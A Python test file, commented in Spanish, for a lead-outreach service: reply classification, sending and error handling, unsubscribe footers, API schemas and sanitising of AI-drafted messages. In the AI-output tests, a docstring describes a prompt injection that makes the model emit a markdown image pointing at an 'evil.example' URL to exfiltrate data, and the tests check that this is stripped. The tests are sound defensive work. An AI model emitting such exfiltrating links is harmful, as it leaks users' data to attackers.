"""Sprint 18, Dev B: clasificador de respuestas, envio al lead y schemas de la API (sin base)."""

from typing import Any

import httpx
import pytest
from pydantic import ValidationError

from app.agents.nodes._tenant import ChannelNotConfiguredError
from app.schemas.lead_sequence_api import (
    FromTemplateRequest,
    ManualMessageRequest,
    SequenceSave,
)
from app.services import lead_outreach
from app.services.lead_outreach import (
    CanalNoDisponibleError,
    EnvioPermanenteError,
    EnvioTemporalError,
    con_pie_de_baja,
    enviar_texto,
    idioma_del_tenant,
)
from app.services.lead_reply_classifier import (
    RESPUESTAS_REALES,
    clasificar_respuesta,
    normalizar,
)
from app.services.lead_sequence_templates import PLANTILLAS
from app.services.messaging.base import MessageContent, TemplateMessage, TemplateNotSupportedError

# ── Clasificador de respuestas ───────────────────────────────────────────────────────────────


class TestClasificador:
    """`clasificar_respuesta`: reglas por palabras, sin IA."""

    @pytest.mark.parametrize(
        "texto",
        [
            "BAJA",
            "Por favor dame de baja",
            "stop",
            "STOP.",
            "unsubscribe me please",
            "no me escriban mas",
            "No quiero recibir mas mensajes",
            "Dejen de escribirme",
            "Do not contact me",
            "nao quero receber mais mensagens",
        ],
    )
    def test_pedir_la_baja(self, texto: str) -> None:
        assert clasificar_respuesta(texto) == "unsubscribe"

    @pytest.mark.parametrize(
        "texto",
        ["No me interesa", "no gracias", "Not interested", "no estamos interesados, gracias"],
    )
    def test_rechazo_claro(self, texto: str) -> None:
        assert clasificar_respuesta(texto) == "negative"

    @pytest.mark.parametrize(
        "texto",
        [
            "Estoy fuera de la oficina hasta el lunes",
            "Respuesta automática: de vacaciones",
            "I am out of office until Monday",
            "Resposta automática",
        ],
    )
    def test_ausencia_no_es_una_persona_contestando(self, texto: str) -> None:
        assert clasificar_respuesta(texto) == "out_of_office"
        assert "out_of_office" not in RESPUESTAS_REALES

    @pytest.mark.parametrize(
        "texto",
        ["¿Cuánto cuesta?", "como funciona", "How much is it?", "Incluye soporte?"],
    )
    def test_pregunta(self, texto: str) -> None:
        assert clasificar_respuesta(texto) == "question"

    @pytest.mark.parametrize(
        "texto", ["Me interesa, hablemos", "Sounds good", "Quiero saber más", "agendemos"]
    )
    def test_interes(self, texto: str) -> None:
        assert clasificar_respuesta(texto) == "positive"

    @pytest.mark.parametrize("texto", ["ok", "Gracias", "👍", "Buenas tardes"])
    def test_el_resto_es_neutral(self, texto: str) -> None:
        assert clasificar_respuesta(texto) == "neutral"

    @pytest.mark.parametrize("texto", [None, "", "   \n "])
    def test_sin_texto_es_neutral(self, texto: str | None) -> None:
        """Un adjunto o un sticker sigue siendo una respuesta."""
        assert clasificar_respuesta(texto) == "neutral"

    def test_palabras_completas_no_fragmentos(self) -> None:
        """`stop` no encaja en `desktop`, ni `baja` en `bajaron`."""
        assert clasificar_respuesta("Mi desktop esta lento") == "neutral"
        assert clasificar_respuesta("Los precios bajaron") == "neutral"

    def test_ahora_no_no_es_una_baja_ni_un_rechazo(self) -> None:
        """Pedir mas tiempo es una respuesta normal: no bloquea al lead para siempre."""
        assert clasificar_respuesta("Ahora no puedo, escribeme el mes que viene") == "neutral"

    def test_la_ausencia_gana_a_la_baja(self) -> None:
        """Una autorespuesta que dice 'no me escriban a este correo' no es una baja de la persona."""
        texto = "Fuera de la oficina. Por favor no me escriban a este correo hasta el lunes."
        assert clasificar_respuesta(texto) == "out_of_office"

    def test_la_baja_gana_a_la_pregunta(self) -> None:
        assert clasificar_respuesta("¿Pueden dar de baja mi correo? stop") == "unsubscribe"

    def test_texto_enorme_no_se_analiza_entero(self) -> None:
        """La baja escondida tras 1000 caracteres no cuenta; el analisis esta acotado."""
        assert clasificar_respuesta("a" * 1500 + " baja") == "neutral"

    def test_normalizar_quita_acentos_y_signos(self) -> None:
        assert normalizar("  ¡BAJA,   por favor!  ") == "baja por favor"


# ── Envio al lead ────────────────────────────────────────────────────────────────────────────


class _Proveedor:
    """Proveedor falso que anota lo que le mandan y falla a pedido."""

    def __init__(self, falla: Exception | None = None) -> None:
        self.falla = falla
        self.mensajes: list[tuple[str, MessageContent]] = []
        self.plantillas: list[tuple[str, TemplateMessage]] = []

    async def send_message(self, to: str, content: MessageContent, channel_config: Any) -> str:
        if self.falla:
            raise self.falla
        self.mensajes.append((to, content))
        return "ext-1"

    async def send_template(self, to: str, template: TemplateMessage, channel_config: Any) -> str:
        if self.falla:
            raise self.falla
        self.plantillas.append((to, template))
        return "ext-2"


@pytest.fixture
def proveedor(monkeypatch: pytest.MonkeyPatch) -> _Proveedor:
    falso = _Proveedor()
    monkeypatch.setattr(lead_outreach, "get_channel_config", lambda canal: ("falso", {}))
    monkeypatch.setattr(lead_outreach, "get_messaging_provider", lambda nombre, cfg=None: falso)
    return falso


def _http(estado: int) -> httpx.HTTPStatusError:
    peticion = httpx.Request("POST", "https://api.example.com")
    return httpx.HTTPStatusError(
        "x", request=peticion, response=httpx.Response(estado, request=peticion)
    )


class TestEnvio:
    """`enviar_texto` clasifica los fallos y arma bien cada canal."""

    async def test_whatsapp_con_plantilla_manda_la_plantilla(self, proveedor: _Proveedor) -> None:
        externo = await enviar_texto(
            canal="whatsapp",
            destino="573001112233",
            texto="no se usa",
            plantilla_whatsapp="bienvenida_v1",
            idioma="es",
        )

        assert externo == "ext-2"
        assert not proveedor.mensajes
        destino, plantilla = proveedor.plantillas[0]
        assert destino == "573001112233"
        assert plantilla.template_name == "bienvenida_v1"
        assert plantilla.language == "es"

    async def test_whatsapp_sin_plantilla_manda_texto(self, proveedor: _Proveedor) -> None:
        await enviar_texto(canal="whatsapp", destino="573001112233", texto="Hola")

        assert proveedor.mensajes[0][1].text == "Hola"
        assert proveedor.mensajes[0][1].metadata is None

    async def test_email_abre_un_hilo_con_su_asunto(self, proveedor: _Proveedor) -> None:
        await enviar_texto(canal="email", destino="a@b.com", texto="Hola", asunto="Bienvenido")

        meta = proveedor.mensajes[0][1].metadata
        assert meta == {"subject": "Bienvenido", "new_thread": True}

    async def test_plantilla_de_whatsapp_se_ignora_en_otro_canal(
        self, proveedor: _Proveedor
    ) -> None:
        await enviar_texto(canal="email", destino="a@b.com", texto="Hola", plantilla_whatsapp="x")

        assert proveedor.mensajes
        assert not proveedor.plantillas

    @pytest.mark.parametrize(
        ("falla", "tipo", "codigo"),
        [
            (_http(500), EnvioTemporalError, "provider_http_500"),
            (_http(503), EnvioTemporalError, "provider_http_503"),
            (_http(429), EnvioTemporalError, "provider_http_429"),
            (_http(408), EnvioTemporalError, "provider_http_408"),
            (_http(400), EnvioPermanenteError, "provider_rejected_400"),
            (_http(404), EnvioPermanenteError, "provider_rejected_404"),
            (httpx.ConnectError("x"), EnvioTemporalError, "provider_unreachable"),
            (TimeoutError(), EnvioTemporalError, "provider_unreachable"),
            (
                ValueError("Destinatario de email invalido"),
                EnvioPermanenteError,
                "invalid_destination",
            ),
            (TemplateNotSupportedError(), EnvioPermanenteError, "channel_unsupported"),
            (NotImplementedError(), EnvioPermanenteError, "channel_unsupported"),
            (RuntimeError("raro"), EnvioTemporalError, "provider_error"),
        ],
    )
    async def test_clasifica_los_fallos(
        self,
        monkeypatch: pytest.MonkeyPatch,
        falla: Exception,
        tipo: type[Exception],
        codigo: str,
    ) -> None:
        falso = _Proveedor(falla=falla)
        monkeypatch.setattr(lead_outreach, "get_channel_config", lambda canal: ("falso", {}))
        monkeypatch.setattr(lead_outreach, "get_messaging_provider", lambda n, cfg=None: falso)

        with pytest.raises(tipo) as info:
            await enviar_texto(canal="email", destino="a@b.com", texto="Hola")

        assert info.value.code == codigo  # type: ignore[attr-defined]

    async def test_el_codigo_no_lleva_el_destino_ni_el_texto(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """El detalle de la excepcion del proveedor puede traer el destino: no se copia."""
        falso = _Proveedor(falla=ValueError("Destinatario invalido: secreto@privado.com"))
        monkeypatch.setattr(lead_outreach, "get_channel_config", lambda canal: ("falso", {}))
        monkeypatch.setattr(lead_outreach, "get_messaging_provider", lambda n, cfg=None: falso)

        with pytest.raises(EnvioPermanenteError) as info:
            await enviar_texto(canal="email", destino="secreto@privado.com", texto="Hola")

        assert "secreto" not in str(info.value)
        assert "secreto" not in info.value.code

    async def test_canal_sin_configurar(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def sin_canal(canal: str) -> Any:
            raise ChannelNotConfiguredError("sin credenciales")

        monkeypatch.setattr(lead_outreach, "get_channel_config", sin_canal)

        with pytest.raises(CanalNoDisponibleError) as info:
            await enviar_texto(canal="email", destino="a@b.com", texto="Hola")

        assert info.value.code == "channel_not_configured"

    async def test_proveedor_no_registrado_es_canal_no_disponible(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def no_registrado(nombre: str, cfg: Any = None) -> Any:
            raise ValueError("Provider no registrado")

        monkeypatch.setattr(lead_outreach, "get_channel_config", lambda canal: ("x", {}))
        monkeypatch.setattr(lead_outreach, "get_messaging_provider", no_registrado)

        with pytest.raises(CanalNoDisponibleError):
            await enviar_texto(canal="email", destino="a@b.com", texto="Hola")


class TestPieDeBaja:
    """Cada mensaje de secuencia ofrece la baja, en el idioma del tenant."""

    @pytest.mark.parametrize("idioma", ["es", "en", "pt"])
    def test_el_pie_se_reconoce_como_baja(self, idioma: str) -> None:
        """Lo que pide el pie ('responde BAJA'/'reply STOP') lo entiende el clasificador."""
        pie = con_pie_de_baja("Hola", idioma).split("\n\n")[1]
        # El lead copia la palabra clave del pie: BAJA o STOP.
        palabra = "BAJA" if idioma == "es" else "STOP"
        assert palabra in pie
        assert clasificar_respuesta(palabra) == "unsubscribe"

    def test_idioma_desconocido_usa_espanol(self) -> None:
        assert "BAJA" in con_pie_de_baja("Hola", "xx")

    def test_el_texto_va_primero_y_separado(self) -> None:
        assert con_pie_de_baja("Hola", "es").startswith("Hola\n\n")

    @pytest.mark.parametrize(
        ("ajustes", "esperado"),
        [
            ({"default_language": "en"}, "en"),
            ({"default_language": "pt-BR"}, "pt"),
            ({"default_language": "fr"}, "es"),
            ({}, "es"),
            (None, "es"),
            ({"default_language": None}, "es"),
        ],
    )
    def test_idioma_del_tenant(self, ajustes: Any, esperado: str) -> None:
        assert idioma_del_tenant(ajustes) == esperado


# ── Schemas de la API ────────────────────────────────────────────────────────────────────────


class TestSchemasApi:
    """Los cuerpos de la API rechazan lo que no deben."""

    def _definicion(self) -> dict[str, Any]:
        d = PLANTILLAS["outbound_cold"]
        return d.model_dump(mode="json")

    def test_secuencia_save_acepta_una_plantilla_y_su_estado(self) -> None:
        datos = {**self._definicion(), "is_active": False}
        assert SequenceSave.model_validate(datos).is_active is False

    def test_secuencia_save_esta_encendida_por_defecto(self) -> None:
        assert SequenceSave.model_validate(self._definicion()).is_active is True

    def test_secuencia_save_rechaza_campos_desconocidos(self) -> None:
        with pytest.raises(ValidationError):
            SequenceSave.model_validate({**self._definicion(), "client_id": "x"})

    def test_mensaje_manual_rechaza_canal_desconocido(self) -> None:
        with pytest.raises(ValidationError):
            ManualMessageRequest.model_validate({"channel": "sms", "text": "hola"})

    def test_mensaje_manual_rechaza_texto_vacio_o_enorme(self) -> None:
        with pytest.raises(ValidationError):
            ManualMessageRequest.model_validate({"channel": "email", "text": "   "})
        with pytest.raises(ValidationError):
            ManualMessageRequest.model_validate({"channel": "email", "text": "x" * 4001})

    def test_desde_plantilla_rechaza_campos_extra(self) -> None:
        with pytest.raises(ValidationError):
            FromTemplateRequest.model_validate({"template": "outbound_cold", "is_active": True})


# ── Redaccion con IA: salida del modelo ──────────────────────────────────────────────────────


class _Cadena:
    """Lo que devuelve `get_chat_model(...).with_structured_output(...)`."""

    def __init__(self, respuesta: Any = None, falla: Exception | None = None) -> None:
        self.respuesta = respuesta
        self.falla = falla

    async def ainvoke(self, mensajes: Any) -> Any:
        if self.falla:
            raise self.falla
        return self.respuesta


class _Modelo:
    def __init__(self, cadena: _Cadena) -> None:
        self.cadena = cadena

    def with_structured_output(self, esquema: Any, include_raw: bool = False) -> _Cadena:
        return self.cadena


def _preparado(max_chars: int = 500) -> Any:
    from uuid import uuid4

    from app.services.lead_sequence_ai import MensajeIaPreparado

    return MensajeIaPreparado(client_id=uuid4(), sistema="s", prompt="p", max_chars=max_chars)


@pytest.fixture
def uso(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """Registra las llamadas a `record_usage` en vez de tocar Redis y la base."""
    from app.services import lead_sequence_ai

    llamadas: list[dict[str, Any]] = []

    async def registrar(**kwargs: Any) -> None:
        llamadas.append(kwargs)

    monkeypatch.setattr(lead_sequence_ai.TokenBudgetGuard, "record_usage", registrar)
    monkeypatch.setattr(lead_sequence_ai, "extract_usage", lambda crudo: (11, 7))
    return llamadas


def _con_modelo(monkeypatch: pytest.MonkeyPatch, cadena: _Cadena) -> None:
    from app.services import lead_sequence_ai

    monkeypatch.setattr(
        lead_sequence_ai, "get_chat_model", lambda modelo, temperature=0.0: _Modelo(cadena)
    )


class TestSalidaDeLaIa:
    """Lo que el modelo devuelve se sanea antes de enviarse (OWASP LLM05)."""

    async def test_quita_imagenes_markdown_y_etiquetas_de_datos(
        self, monkeypatch: pytest.MonkeyPatch, uso: list[dict[str, Any]]
    ) -> None:
        """Una inyeccion pide `![](https://evil/?q=datos)`: en un cliente que la carga, exfiltra."""
        from app.services.lead_sequence_ai import SalidaMensaje, redactar

        sucio = "Hola ![x](https://evil.example/?q=secreto) amigo <datos-0123456789ab>fin</datos-0123456789ab>"
        _con_modelo(monkeypatch, _Cadena({"raw": object(), "parsed": SalidaMensaje(message=sucio)}))

        texto, motivo = await redactar(_preparado())

        assert motivo is None
        assert texto is not None
        assert "evil.example" not in texto
        assert "datos-" not in texto
        assert texto.startswith("Hola")

    async def test_recorta_al_largo_del_canal(
        self, monkeypatch: pytest.MonkeyPatch, uso: list[dict[str, Any]]
    ) -> None:
        from app.services.lead_sequence_ai import SalidaMensaje, redactar

        _con_modelo(
            monkeypatch,
            _Cadena({"raw": object(), "parsed": SalidaMensaje(message="a" * 2000)}),
        )

        texto, _ = await redactar(_preparado(max_chars=100))

        assert texto is not None
        assert len(texto) == 100

    async def test_registra_el_consumo_de_tokens(
        self, monkeypatch: pytest.MonkeyPatch, uso: list[dict[str, Any]]
    ) -> None:
        from app.services.lead_sequence_ai import OPERATION, SalidaMensaje, redactar

        _con_modelo(
            monkeypatch, _Cadena({"raw": object(), "parsed": SalidaMensaje(message="Hola")})
        )

        await redactar(_preparado())

        assert len(uso) == 1
        assert (uso[0]["prompt_tokens"], uso[0]["completion_tokens"]) == (11, 7)
        assert uso[0]["operation"] == OPERATION

    async def test_si_el_modelo_falla_no_hay_texto(
        self, monkeypatch: pytest.MonkeyPatch, uso: list[dict[str, Any]]
    ) -> None:
        from app.services.lead_sequence_ai import SKIP_MODEL_FAILED, redactar

        _con_modelo(monkeypatch, _Cadena(falla=RuntimeError("timeout")))

        assert await redactar(_preparado()) == (None, SKIP_MODEL_FAILED)

    async def test_una_salida_que_no_es_el_esquema_no_se_envia(
        self, monkeypatch: pytest.MonkeyPatch, uso: list[dict[str, Any]]
    ) -> None:
        """Con `parsed=None` (el modelo no cumplio el esquema) no hay mensaje, pero si consumo."""
        from app.services.lead_sequence_ai import SKIP_MODEL_FAILED, redactar

        _con_modelo(monkeypatch, _Cadena({"raw": object(), "parsed": None}))

        assert await redactar(_preparado()) == (None, SKIP_MODEL_FAILED)
        assert len(uso) == 1

    async def test_una_salida_que_queda_vacia_tras_sanear_no_se_envia(
        self, monkeypatch: pytest.MonkeyPatch, uso: list[dict[str, Any]]
    ) -> None:
        from app.services.lead_sequence_ai import SKIP_EMPTY, SalidaMensaje, redactar

        _con_modelo(
            monkeypatch,
            _Cadena({"raw": object(), "parsed": SalidaMensaje(message="![x](https://evil/?q=1)")}),
        )

        assert await redactar(_preparado()) == (None, SKIP_EMPTY)


# ── Disparo por cambio de score ──────────────────────────────────────────────────────────────


class TestDisparoPorScore:
    """`_disparar_si_cambio` solo dispara si el score cambio de verdad."""

    @pytest.fixture
    def disparos(self, monkeypatch: pytest.MonkeyPatch) -> list[str]:
        from app.services import lead_sequence_triggers

        eventos: list[str] = []

        async def falso(session: Any, lead: Any, evento: str) -> int:
            eventos.append(evento)
            return 0

        monkeypatch.setattr(lead_sequence_triggers, "disparar_inscripciones", falso)
        return eventos

    async def test_dispara_si_cambia(self, disparos: list[str]) -> None:
        from types import SimpleNamespace

        from app.services.lead_score_service import _disparar_si_cambio

        await _disparar_si_cambio(None, None, SimpleNamespace(previous_score=10, score=20))  # type: ignore[arg-type]
        await _disparar_si_cambio(None, None, SimpleNamespace(previous_score=None, score=0))  # type: ignore[arg-type]

        assert disparos == ["score_changed", "score_changed"]

    async def test_no_dispara_si_no_cambia_o_no_hay_fila(self, disparos: list[str]) -> None:
        """Un recalculo pedido a mano guarda historial aunque el valor sea el mismo."""
        from types import SimpleNamespace

        from app.services.lead_score_service import _disparar_si_cambio

        await _disparar_si_cambio(None, None, SimpleNamespace(previous_score=20, score=20))  # type: ignore[arg-type]
        await _disparar_si_cambio(None, None, None)  # type: ignore[arg-type]

        assert disparos == []
